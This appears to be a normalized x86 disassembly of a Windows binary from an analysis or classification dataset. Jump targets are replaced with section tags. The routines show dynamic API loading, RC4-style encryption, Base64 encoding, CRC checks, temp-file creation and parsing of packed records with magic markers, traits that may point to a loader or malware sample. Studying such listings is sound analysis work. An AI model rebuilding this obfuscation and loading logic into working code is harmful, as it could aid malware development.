sub_401000
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push ebx
push edi
push eax
call [ CharLowerW@IAT ]
movzx eax ax
xor edi edi
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x880 ] edi
jle r-xdata
xor eax eax
lea ebx [ esi + 0x6 ]
inc edi
add ebx 0x44
cmp edi [ esi + 0x880 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push ebx
add eax 0x2
push eax
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
mov ax [ ebp - 0x4 ]
cmp [ ebx - 0x2 ] ax
jne r-xdata
imul edi edi 0x44
mov eax [ edi + esi ]
jmp r-xdata
pop edi
pop ebx
leave
retn 0x4
sub_40105e
test edi edi
je r-xdata
xor al al
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esi + 0x880 ]
cmp eax 0x20
je r-xdata
imul eax eax 0x44
push 0x1f
push [ esp + 0x8 ]
lea eax [ eax + esi + 0x4 ]
push eax
call [ lstrcpynW@IAT ]
test eax eax
mov eax [ esi + 0x880 ]
jne r-xdata
imul eax eax 0x44
lea eax [ eax + esi + 0x4 ]
push eax
call [ CharLowerW@IAT ]
mov eax [ esi + 0x880 ]
imul eax eax 0x44
mov [ eax + esi ] edi
inc [ esi + 0x880 ]
mov al 0x1
jmp r-xdata
imul eax eax 0x44
xor ecx ecx
mov [ eax + esi + 0x4 ] cx
retn 0x4
sub_4010c5
test ebx ebx
jne r-xdata
push esi
push edi
lea esi [ ecx + 0x4f04 ]
push ebx
call sub_401000
mov edi eax
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ esp + 0xc ]
push edi
call [ GetProcAddress@IAT ]
push ebx
call [ LoadLibraryW@IAT ]
mov edi eax
test edi edi
je r-xdata
retn 0x4
xor eax eax
jmp r-xdata
push ebx
call sub_40105e
pop edi
pop esi
sub_401108
mov eax sub_41d8e5
call sub_4198ec
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ edi + 0x4 ]
call sub_405d11
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x14 ]
call sub_405d11
mov [ ebp - 0x4 ] 0x1
call sub_4015d2
xor eax eax
mov [ edi ] ax
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
sub_40114f
mov eax sub_41d8e5
call sub_4198ec
push esi
push edi
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x14 ]
call sub_405f2c
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x4 ]
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
sub_401186
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
sub esp 0x10
push esi
test edx edx
je r-xdata
xor al al
test eax eax
je r-xdata
test ebx ebx
je r-xdata
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] cl
mov [ ebp - 0xb ] eax
cmp cl 0x1
jbe r-xdata
mov eax [ ebx ]
mov [ ebp - 0x7 ] eax
cmp cl 0x4
jbe r-xdata
pop esi
leave
retn 0x4
mov esi [ edi + 0x18 ]
push 0x0
push ebx
lea ecx [ edi + 0x14 ]
call sub_4060be
mov [ ebp - 0x7 ] esi
jmp r-xdata
cmp cl 0x5
jbe r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0xd
lea ecx [ edi + 0x4 ]
pop eax
call sub_4060be
mov al 0x1
jmp r-xdata
sub_4011e8
push ecx
push ebx
mov ebx ecx
test ebx ebx
je r-xdata
xor al al
test eax eax
je r-xdata
push [ esp + 0xc ]
add eax eax
mov cl 0x6
call sub_401186
jmp r-xdata
pop ebx
pop ecx
retn 0x4
sub_40120a
mov eax sub_41d9b2
call sub_4198ec
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx edx
xor edi edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x1c ] edi
mov eax [ ebx + 0x8 ]
xor edx edx
push 0xd
pop ecx
div ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
jg r-xdata
call sub_405f3e
or [ ebp - 0x18 ] 0xffffffff
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0x4
pop eax
mov ecx esi
call sub_4060be
mov [ ebp - 0x4 ] edi
xor al al
jmp r-xdata
push [ ebp - 0x14 ]
push esi
call sub_4061c3
mov eax [ esi + 0x4 ]
add eax 0x4
push eax
push esi
call sub_4061c3
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
imul edi edi 0xd
add edi [ ebx + 0x4 ]
mov eax [ esi + 0x4 ]
add eax 0x4
push eax
push esi
call sub_4061c3
push 0x0
push edi
push 0xd
pop eax
mov ecx esi
call sub_4060be
inc [ ebp - 0x14 ]
mov al [ edi + 0x4 ]
cmp al 0x1
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
inc [ ebp - 0x1c ]
jmp r-xdata
cmp al 0x4
jbe r-xdata
mov edi [ ebp - 0x1c ]
cmp edi [ ebp - 0x20 ]
jge r-xdata
push 0x0
mov ecx [ edi + 0x9 ]
add ecx [ ebx + 0x14 ]
push ecx
mov eax [ edi + 0x5 ]
mov ecx esi
call sub_4060be
jmp r-xdata
cmp al 0x5
je r-xdata
mov eax [ edi + 0x9 ]
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
jbe r-xdata
dec [ ebp - 0x14 ]
push [ edi + 0x5 ]
push eax
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
cmp al 0x8
jbe r-xdata
push 0x0
push [ ebp - 0x18 ]
mov eax [ edi + 0x5 ]
mov ecx esi
call sub_4060be
jmp r-xdata
dec [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_41314a
pop ecx
jmp r-xdata
sub_401329
push ebp
mov ebp esp
sub esp 0x28
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
xor edx edx
push 0xd
pop ecx
div ecx
xor edx edx
mov esi eax
lea eax [ esi - 0x1 ]
mov [ ebp - 0x14 ] esi
test eax eax
jle r-xdata
pop edi
mov al 0x1
pop esi
leave
retn 0x4
push ebx
mov edx [ ebp - 0x8 ]
inc edx
lea eax [ esi - 0x1 ]
cmp edx eax
jl r-xdata
mov eax edx
imul eax eax 0xd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] ecx
mov ecx edx
imul ecx ecx 0xd
add ecx [ edi ]
mov [ ebp - 0x8 ] edx
inc edx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x10 ] edx
cmp edx esi
jge r-xdata
pop ebx
mov edx [ ebp - 0x10 ]
add [ ebp - 0xc ] 0xd
inc edx
mov [ ebp - 0x10 ] edx
cmp edx esi
jl r-xdata
mov al [ ebx + 0x4 ]
cmp al [ ecx + 0x4 ]
jne r-xdata
mov ebx [ edi ]
add ebx [ ebp - 0xc ]
mov eax [ ebx ]
cmp eax [ ecx ]
jne r-xdata
inc [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0xd
cmp edx [ ebp - 0x8 ]
je r-xdata
mov esi [ ebp - 0x4 ]
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0xd
movsd [ edi ] [ esi ]
push ebx
push [ ebp - 0x4 ]
movsb [ edi ] [ esi ]
call sub_412d60
mov eax [ ebp - 0x28 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1f ]
mov [ ebx + 0x9 ] eax
mov eax [ ebp - 0x23 ]
mov [ ebx + 0x5 ] eax
mov al [ ebp - 0x24 ]
add esp 0xc
mov [ ebx + 0x4 ] al
sub_4013ef
push ebp
mov ebp esp
sub esp 0x20
mov ecx [ eax + 0x4 ]
and [ ebp - 0xc ] 0x0
push esi
push edi
test ecx ecx
je r-xdata
mov al 0x1
mov edi [ eax ]
mov eax [ edi ]
mov [ ebp - 0x18 ] edi
cmp eax ecx
jle r-xdata
add eax 0xfffffff8
add edi 0x8
lea esi [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x10 ] esi
call sub_405f3e
lea esi [ ebx + 0x14 ]
call sub_405f3e
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x0
jle r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x10 ]
call sub_401329
mov esi [ ebp - 0x8 ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
leave
retn
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
mov edx [ ebp - 0x4 ]
push 0xd
sub edx eax
pop ecx
cmp edx ecx
jb r-xdata
mov edx [ ebp - 0x1c ]
cmp eax [ edx ]
ja r-xdata
push 0xfffffffc
pop eax
sub eax [ ebp - 0x14 ]
lea edi [ esi + 0x4 ]
add [ ebp - 0x4 ] eax
inc [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edi
cmp ecx [ eax + 0x4 ]
jl r-xdata
add edi eax
mov al [ edi + 0x4 ]
mov [ ebp - 0x14 ] ecx
cmp al 0x1
jbe r-xdata
push 0x0
mov eax ecx
mov ecx [ ebp - 0x10 ]
push edi
call sub_4060be
cmp al 0x4
jbe r-xdata
push 0x0
push r--data
push 0x2
pop eax
lea ecx [ ebx + 0x14 ]
call sub_4060be
mov eax [ edi + 0x5 ]
mov edx [ esi ]
lea ecx [ eax + 0xd ]
add edx ecx
mov [ ebp - 0x14 ] ecx
cmp edx [ ebp - 0x4 ]
ja r-xdata
cmp al 0x5
je r-xdata
cmp [ edi + 0x4 ] 0x6
jne r-xdata
mov esi [ ebx + 0x18 ]
push 0x0
lea ecx [ edi + 0xd ]
push ecx
lea ecx [ ebx + 0x14 ]
call sub_4060be
mov ecx [ ebp - 0x10 ]
push 0x0
push edi
push 0xd
pop eax
mov [ edi + 0x9 ] esi
call sub_4060be
mov esi [ ebp - 0x8 ]
jmp r-xdata
mov [ edi + 0x4 ] 0x6
jbe r-xdata
cmp al 0x8
jbe r-xdata
jmp r-xdata
sub_40151f
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov esi [ eax ]
mov eax [ ecx + 0x8 ]
push 0xd
xor edx edx
pop ebx
div ebx
xor edi edi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ecx + 0x4 ]
mov edx edi
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov bl [ ebp + 0xc ]
cmp bl [ ecx + 0x4 ]
jne r-xdata
inc edi
add ecx 0xd
cmp edi eax
jl r-xdata
inc edx
cmp [ ebp + 0x10 ] edx
je r-xdata
cmp esi [ ecx ]
jne r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_40157f
or [ esi ] 0xffffffff
push 0x1
push 0x1
push [ esp + 0xc ]
call sub_40151f
test eax eax
jne r-xdata
cmp [ eax + 0x5 ] 0x4
je r-xdata
xor al al
jmp r-xdata
mov eax [ eax + 0x9 ]
mov [ esi ] eax
mov al 0x1
and [ esi ] 0x0
jmp r-xdata
retn 0x4
sub_4015ac
push 0x1
push 0x6
push [ esp + 0xc ]
mov ecx esi
mov [ edi ] esi
call sub_40151f
test eax eax
jne r-xdata
mov eax [ eax + 0x9 ]
add eax [ esi + 0x14 ]
mov [ edi ] eax
mov al 0x1
xor al al
jmp r-xdata
retn 0x4
sub_4015e7
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
push 0x3f
mov esi edx
pop ebx
cmp edi 0x3
jl r-xdata
test edi edi
jne r-xdata
push 0x3
pop ebx
xor edx edx
div ebx
push 0x3f
pop ebx
mov [ ebp - 0x4 ] eax
imul eax eax 0xfffffffd
add edi eax
movzx eax [ esi ]
shl eax 0x10
dec edi
mov [ ecx + 0x3 ] 0x3d
je r-xdata
mov [ ecx ] 0x0
jmp r-xdata
movzx edx [ esi ]
movzx eax [ esi + 0x1 ]
shl edx 0x8
or edx eax
movzx eax [ esi + 0x2 ]
shl edx 0x8
or edx eax
mov eax edx
shr eax 0x12
and eax ebx
mov al [ eax + r--data ]
mov [ ecx ] al
mov eax edx
shr eax 0xc
and eax ebx
mov al [ eax + r--data ]
mov [ ecx + 0x1 ] al
mov eax edx
shr eax 0x6
and eax ebx
mov al [ eax + r--data ]
and edx ebx
mov [ ecx + 0x2 ] al
mov al [ edx + r--data ]
mov [ ecx + 0x3 ] al
add esi 0x3
add ecx 0x4
dec [ ebp - 0x4 ]
jne r-xdata
mov [ ecx + 0x2 ] 0x3d
movzx edx [ esi + 0x1 ]
shl edx 0x8
or eax edx
mov edx eax
shr edx 0x6
and edx ebx
mov dl [ edx + r--data ]
mov [ ecx + 0x2 ] dl
jmp r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
mov edx eax
shr edx 0xc
and edx ebx
mov dl [ edx + r--data ]
shr eax 0x12
and eax ebx
mov [ ecx + 0x1 ] dl
mov al [ eax + r--data ]
mov [ ecx ] al
sub_4016e2
push ebp
mov ebp esp
sub esp 0x228
and [ ebp - 0x8 ] 0x0
push esi
lea eax [ ebp - 0x224 ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
jle r-xdata
xor al al
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x224 ]
push eax
push [ ebp + 0x8 ]
call [ lstrcpynW@IAT ]
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
call [ UuidCreate@IAT ]
test eax eax
jne r-xdata
pop esi
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ UuidToStringW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x224 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x226 ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x224 ]
push eax
call esi
lea eax [ ebp - 0x8 ]
push eax
call [ RpcStringFreeW@IAT ]
push r--data
lea eax [ ebp - 0x224 ]
push eax
call esi
sub_40178c
test edx edx
je r-xdata
xor al al
cmp [ eax ] 0x1
jbe r-xdata
cmp [ esp + 0x8 ] 0x1
jbe r-xdata
push eax
push [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
call sub_405b60
neg eax
pop ecx
sbb al al
pop ecx
inc al
jmp r-xdata
retn 0x8
sub_4017b9
push ecx
push esi
lea esi [ ecx + eax ]
push edi
xor edi edi
mov edx ecx
mov eax 0x80
cmp ecx esi
jae r-xdata
mov eax edi
pop edi
pop esi
pop ecx
retn
push ebx
mov bl [ esp + 0xf ]
test al bl
je r-xdata
mov bl [ edx ]
xor eax eax
inc eax
inc edx
inc edx
inc edi
movzx ecx [ edx ]
shr ecx 0x2
add ecx 0x3
add edx 0x2
dec ecx
js r-xdata
add eax eax
cmp eax 0x100
jne r-xdata
pop ebx
cmp edx esi
jb r-xdata
lea edi [ edi + ecx + 0x1 ]
jmp r-xdata
sub_401806
xor ecx ecx
or eax 0xffffffff
cmp [ esp + 0x8 ] ecx
ja r-xdata
mov edx [ esp + 0x4 ]
movzx edx [ ecx + edx ]
xor edx eax
and edx 0xff
shr eax 0x8
xor eax [ edx * 4 + rw-data ]
inc ecx
cmp ecx [ esp + 0x8 ]
jb r-xdata
xor eax eax
jmp r-xdata
retn 0x8
sub_401839
mov ecx [ eax + 0x4 ]
push esi
mov esi [ eax ]
shr ecx 0x2
mov eax ecx
cdq
push edi
sub eax edx
xor edi edi
sar eax 0x1
pop edi
pop esi
retn 0x4
jae r-xdata
lea edi [ eax + 0x1 ]
mov ecx eax
jmp r-xdata
mov edx [ esi + eax * 4 ]
cmp [ esp + 0xc ] edx
je r-xdata
mov eax ecx
sub eax edi
cdq
sub eax edx
sar eax 0x1
add eax edi
cmp edi ecx
jl r-xdata
sub_401872
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi eax
mov esi [ edi + 0x4 ]
push ebx
shr esi 0x2
call sub_401839
mov [ ebp - 0x8 ] eax
cmp eax esi
jge r-xdata
push ebx
mov ecx edi
call sub_406161
jmp r-xdata
mov ecx [ edi ]
cmp [ ecx + eax * 4 ] ebx
jne r-xdata
mov al 0x1
and [ ebp - 0x4 ] 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x4
pop eax
mov ecx edi
call sub_4060be
mov eax [ ebp - 0x8 ]
mov edi [ edi ]
sub esi eax
lea edi [ edi + eax * 4 ]
shl esi 0x2
push esi
lea eax [ edi + 0x4 ]
push edi
push eax
call sub_412d60
add esp 0xc
mov [ edi ] ebx
xor al al
jmp r-xdata
pop edi
pop esi
leave
retn
sub_4018da
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ eax + 0x4 ]
shr esi 0x2
push edi
mov edi [ eax ]
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ edi + eax * 4 ]
mov eax [ ebp + 0x8 ]
call sub_401872
test [ ebp - 0x4 ] 0xf
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jl r-xdata
mov ebx [ Sleep@IAT ]
push 0xa
call ebx
push 0x0
call ebx
sub_401923
push ebp
lea ebp [ esp - 0x70 ]
sub esp 0x104
cmp [ ebp + 0x7c ] 0x1
jg r-xdata
push ebx
push esi
xor ecx ecx
push edi
mov [ ebp + 0x6e ] cl
xor eax eax
mov edi 0x100
xor al al
jmp r-xdata
mov [ ebp + eax - 0x92 ] al
inc eax
cmp eax edi
jl r-xdata
mov [ ebp - 0x94 ] cx
xor esi esi
add ebp 0x70
leave
retn 0x8
mov [ ebp - 0x93 ] cl
mov dl [ eax ]
movzx ecx cl
lea ecx [ ebp + ecx - 0x92 ]
mov bl [ ecx ]
mov [ eax ] bl
mov [ ecx ] dl
movzx eax [ ebp - 0x94 ]
inc eax
and eax 0x8000001f
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
inc esi
mov [ ebp - 0x94 ] al
cmp esi edi
jl r-xdata
dec eax
or eax 0xffffffe0
inc eax
movzx ecx [ ebp - 0x94 ]
movzx ecx [ ecx + rw-data ]
lea eax [ ebp + esi - 0x92 ]
movzx edx [ eax ]
add ecx edx
movzx edx [ ebp - 0x93 ]
add ecx edx
and ecx 0x800000ff
jns r-xdata
xor edi edi
mov [ ebp + 0x6e ] 0x1
cmp [ ebp + 0x7c ] edi
jle r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
movzx esi [ ebp - 0x93 ]
movzx eax al
mov [ ebp - 0x94 ] al
movzx eax al
lea eax [ ebp + eax - 0x92 ]
movzx ecx [ eax ]
add ecx esi
and ecx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov [ ebp - 0x93 ] cl
mov dl [ eax ]
movzx ecx cl
lea ecx [ ebp + ecx - 0x92 ]
mov bl [ ecx ]
mov [ eax ] bl
mov [ ecx ] dl
movzx esi [ ebp - 0x93 ]
movzx eax [ ebp - 0x94 ]
movzx edx [ ebp + esi - 0x92 ]
movzx ebx [ ebp + eax - 0x92 ]
mov ecx [ ebp + 0x78 ]
add edx ebx
and edx 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx edx dl
mov dl [ ebp + edx - 0x92 ]
xor [ ecx + edi ] dl
inc edi
cmp edi [ ebp + 0x7c ]
jl r-xdata
dec edx
or edx 0xffffff00
inc edx
inc eax
and eax 0x800000ff
jns r-xdata
sub_401a84
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
mov edi ecx
mov ecx [ eax ]
lea edx [ edi + 0xc ]
mov [ ebp - 0x10 ] ecx
call sub_401eea
test al al
je r-xdata
xor al al
cmp [ edi + 0x8 ] ecx
jae r-xdata
push edi
lea edi [ ebp - 0x10 ]
call sub_401f12
mov edi eax
cmp [ edi + 0x10 ] 0x80051a85
pop ecx
jne r-xdata
mov al 0x1
jmp r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x2bfc ] 0x0
jle r-xdata
pop edi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x4f00 ] 0x0
jle r-xdata
mov [ ebp - 0xc ] 0xfffff5f8
sub [ ebp - 0xc ] esi
lea ebx [ esi + 0xa08 ]
mov [ esi + 0x581c ] 0x0
mov ecx [ edi + 0x18 ]
cmp ecx 0xff00aaee
je r-xdata
mov [ ebp - 0xc ] 0xffffd2f4
sub [ ebp - 0xc ] esi
lea ebx [ esi + 0x2d0c ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add ebx 0x118
cmp eax [ esi + 0x2bfc ]
jl r-xdata
mov eax [ rw-data ]
cmp eax [ edi + 0x20 ]
je r-xdata
push [ esi + 0x5814 ]
call sub_405c44
mov ebx [ edi + 0x24 ]
cmp ebx 0x6400000
ja r-xdata
cmp ecx 0xff00bb00
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add ebx 0x118
cmp eax [ esi + 0x4f00 ]
jl r-xdata
mov eax [ rw-data ]
cmp eax [ edi + 0x20 ]
je r-xdata
mov eax [ edi + 0x18 ]
cmp eax [ ebx - 0x108 ]
jne r-xdata
mov eax [ ebx ]
test eax eax
jle r-xdata
xor ecx ecx
test ebx ebx
jne r-xdata
push edi
lea edi [ ebp - 0x10 ]
call sub_401f12
mov edi eax
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0x581c ] 0x1
mov eax [ edi + 0x18 ]
cmp eax [ ebx - 0x108 ]
jne r-xdata
mov eax [ ebx ]
xor ecx ecx
cmp eax ecx
jle r-xdata
mov eax [ edi + 0x24 ]
mov [ ebp - 0x8 ] eax
cmp eax 0x6400000
ja r-xdata
cmp eax 0x10
jl r-xdata
mov eax [ edi + 0x24 ]
push eax
mov [ esi + 0x5818 ] eax
lea eax [ edi + 0x36 ]
push eax
push ecx
call sub_412d60
add esp 0xc
add ebx 0x4
cmp [ rw-data ] 0x0
jne r-xdata
inc ebx
mov eax [ edi + 0x24 ]
mov [ ebp - 0x8 ] eax
cmp eax 0x6400000
ja r-xdata
cmp eax 0x10
jl r-xdata
xor eax eax
test eax eax
jne r-xdata
and [ ebx ] 0x0
push 0x0
call [ SetLastError@IAT ]
push ebx
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
call sub_405c10
test al al
je r-xdata
mov edx [ ebx ]
mov eax [ ebp - 0xc ]
shl edx 0x4
add eax ebx
add edx eax
mov [ edx + esi + 0x2c0c ] ecx
mov ecx [ ebx ]
mov edx ecx
shl edx 0x4
add edx eax
cmp [ edx + esi + 0x2c0c ] 0x0
je r-xdata
cmp eax ecx
jne r-xdata
mov [ ebx ] ecx
mov edx [ edi + 0x24 ]
mov [ eax + esi + 0x90c ] edx
mov eax [ ebx ]
mov edx [ edi + 0x20 ]
add eax 0x91
shl eax 0x4
add eax ecx
mov [ eax + esi ] edx
mov eax [ edi + 0x20 ]
push [ edi + 0x24 ]
mov [ rw-data ] eax
lea eax [ edi + 0x36 ]
push eax
mov eax [ ebx ]
shl eax 0x4
add eax ecx
push [ eax + esi + 0x908 ]
call sub_412d60
add esp 0xc
inc [ ebx ]
add [ ebp - 0x8 ] 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push 0x0
call [ ExitProcess@IAT ]
mov ecx eax
jmp r-xdata
mov edx [ edi + 0x24 ]
add ecx 0x2c1
shl ecx 0x4
add ecx eax
mov [ ecx + esi ] edx
mov ecx [ ebx ]
mov edx [ edi + 0x20 ]
shl ecx 0x4
add ecx eax
mov [ ecx + esi + 0x2c14 ] edx
mov ecx [ edi + 0x20 ]
push [ edi + 0x24 ]
mov [ rw-data ] ecx
lea ecx [ edi + 0x36 ]
push ecx
mov ecx [ ebx ]
shl ecx 0x4
add ecx eax
push [ ecx + esi + 0x2c0c ]
call sub_412d60
add esp 0xc
inc [ ebx ]
add [ ebp - 0x8 ] 0x4
cmp [ rw-data ] ecx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push 0x0
call [ SetLastError@IAT ]
push [ ebp - 0x8 ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
call sub_405c10
test al al
je r-xdata
mov [ esi + 0x5814 ] ecx
test ecx ecx
je r-xdata
push 0x0
call [ SetLastError@IAT ]
push [ ebp - 0x8 ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
call sub_405c10
test al al
jne r-xdata
mov edx [ ebx ]
mov ecx [ ebp - 0xc ]
add ecx ebx
shl edx 0x4
add edx ecx
mov [ edx + esi + 0x908 ] eax
mov eax [ ebx ]
shl eax 0x4
add eax ecx
cmp [ eax + esi + 0x908 ] 0x0
je r-xdata
mov ecx eax
xor ecx ecx
jmp r-xdata
sub_401dc3
mov eax sub_41d81e
call sub_4198ec
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40264d
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
imul ecx ecx 0x14
lea edx [ esi + 0xc ]
push edx
push [ esi + 0x8 ]
push eax
call [ ecx + eax + 0x308 ]
add esp 0xc
mov [ esi + 0x10 ] al
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_401e25
push esi
push edi
xor esi esi
call sub_4046cc
mov edi rw-data
push edi
call sub_405cd1
test al al
je r-xdata
pop edi
mov eax esi
pop esi
retn
mov esi [ rw-data ]
shr esi 0x2
call sub_4046cc
push edi
call sub_405cf1
sub_401e56
push esi
call sub_4046cc
mov eax [ eax ]
imul eax eax 0x3
cdq
sub eax edx
mov esi eax
sar esi 0x1
call sub_4046cc
cmp esi 0x6400000
ja r-xdata
xor esi esi
test esi esi
jne r-xdata
inc [ rw-data ]
mov eax [ rw-data ]
push 0x10
mov [ esi + 0x4 ] eax
lea eax [ esi + 0xc ]
push rw-data
push eax
mov [ esi ] 0xdeadface
call sub_412d60
add esp 0xc
mov eax esi
pop esi
retn
xor eax eax
pop esi
retn
add esi 0x4
cmp [ rw-data ] 0x0
jne r-xdata
inc esi
push 0x0
call [ SetLastError@IAT ]
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
call sub_405c10
test al al
je r-xdata
mov esi eax
jmp r-xdata
push eax
call [ ExitProcess@IAT ]
test esi esi
jne r-xdata
sub_401eea
push ebx
push esi
xor esi esi
mov al 0x1
sub edx rw-data
xor al al
inc esi
cmp esi 0x10
jl r-xdata
mov bl [ edx + esi + rw-data ]
cmp bl [ esi + rw-data ]
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
sub_401f12
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ edi ]
sub eax 0x10
push ebx
xor ecx ecx
push esi
test eax eax
jle r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
mov eax [ edi ]
inc ecx
sub eax 0x10
inc ebx
cmp ecx eax
jl r-xdata
mov edx ebx
call sub_401eea
test al al
je r-xdata
mov al [ ebx ]
cmp al [ rw-data ]
jne r-xdata
mov esi [ ebx + 0x34 ]
mov eax [ ebp + 0x8 ]
add ebx 0x10
add ecx 0x10
add esi 0x32
lea eax [ ecx + eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
cmp esi [ edi ]
jg r-xdata
call sub_4046cc
xor eax eax
cmp [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebx + 0x24 ]
cmp ecx [ edi ]
jae r-xdata
push esi
push [ ebp - 0x4 ]
call sub_401806
mov ecx [ ebp - 0x8 ]
cmp eax [ ebx ]
je r-xdata
push 0xffffffe8
pop eax
sub eax esi
add [ edi ] eax
mov eax ebx
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_401f98
mov eax sub_41d814
call sub_4198ec
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40264d
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x8 ]
imul ecx ecx 0x18
push [ esi + 0xc ]
push [ esi + 0x4 ]
push eax
call [ ecx + eax + 0x4 ]
add esp 0xc
mov [ esi + 0x10 ] al
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_401ff6
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ rw-data ]
push edi
mov [ ebp - 0x1 ] 0x0
call sub_4046cc
mov eax [ eax ]
xor edi edi
mov ecx esi
cmp eax edi
je r-xdata
push 0x10
